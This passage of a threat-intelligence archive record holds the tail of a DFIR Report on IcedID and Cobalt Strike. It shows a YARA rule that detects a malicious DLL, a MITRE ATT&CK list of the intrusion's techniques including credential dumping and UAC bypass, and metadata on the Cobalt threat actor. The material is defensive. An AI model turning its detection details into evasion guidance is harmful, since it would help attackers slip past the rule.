DFIR Report\"\nreference = \"https://thedfirreport.com\"\ndate = \"2021-07-13\"\nhash1 = \"e27b71bd1ba7e1f166c2553f7f6dba1d6e25fa2f3bb4d08d156073d49cbc360a\"\nstrings:\n$s1 = \"f159.dll\" fullword ascii\n$s2 = \"AppPolicyGetProcessTerminationMethod\" fullword ascii\n$s3 = \"ossl_store_get0_loader_int\" fullword ascii\n$s4 = \"loader incomplete\" fullword ascii\n$s5 = \"log conf missing description\" fullword ascii\n$s6 = \"SqlExec\" fullword ascii\n$s7 = \"process_include\" fullword ascii\n$s8 = \"EVP_PKEY_get0_siphash\" fullword ascii\n$s9 = \"process_pci_value\" fullword ascii\n$s10 = \"EVP_PKEY_get_raw_public_key\" fullword ascii\n$s11 = \"EVP_PKEY_get_raw_private_key\" fullword ascii\n$s12 = \"OSSL_STORE_INFO_get1_NAME_description\" fullword ascii\n$s13 = \"divisor->top > 0 && divisor->d[divisor->top - 1] != 0\" fullword wide\n$s14 = \"ladder post failure\" fullword ascii\n$s15 = \"operation fail\" fullword ascii\n$s16 = \"ssl command section not found\" fullword ascii\n$s17 = \"log key invalid\" fullword ascii\n$s18 = \"cms_get0_econtent_type\" fullword ascii\n$s19 = \"log conf missing key\" fullword ascii\n$s20 = \"ssl command section empty\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and filesize < 11000KB and\n( pe.imphash() == \"547a74a834f9965f00df1bd9ed30b8e5\" or 8 of them )\n}\n\n## MITRE\n\n#### Spearphishing Attachment – T1566.001\n Malicious File – T1204.002\n Signed Binary Proxy Execution – T1218\n Windows Management Instrumentation – T1047\n Command and Scripting Interpreter – T1059\n PowerShell – T1059.001\n Windows Command Shell – T1059.003\n Service Execution – T1569.002\n Windows Service – T1543.003\n Bypass User Account Control – T1548.002\n OS Credential Dumping – T1003\n\n```\n\n-----\n\n#### System Information Discovery – T1082 Security Software Discovery – T1518.001 Domain Trust Discovery – T1482 Network Share Discovery – T1135 SMB/Windows Admin Shares – T1021.002 Lateral Tool Transfer – T1570 Application Layer Protocol – T1071\n\n Internal case #4485\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-19 - IcedID and Cobalt Strike vs Antivirus.pdf"
    ],
    "report_names": [
        "2021-07-19 - IcedID and Cobalt Strike vs Antivirus.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535672,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653761044,
    "ts_modification_date": 1653761044,
    "files": {
        "pdf": "https://archive.orkl.eu/29a6227cc74ba59834a45c84a448385dbc1bacd1.pdf",
        "text": "https://archive.orkl.eu/29a6227cc74ba59834a45c84a448385dbc1bacd1.txt",
        "img": "https://archive.orkl.eu/29a6227cc74ba59834a45c84a448385dbc1bacd1.jpg"
    }
}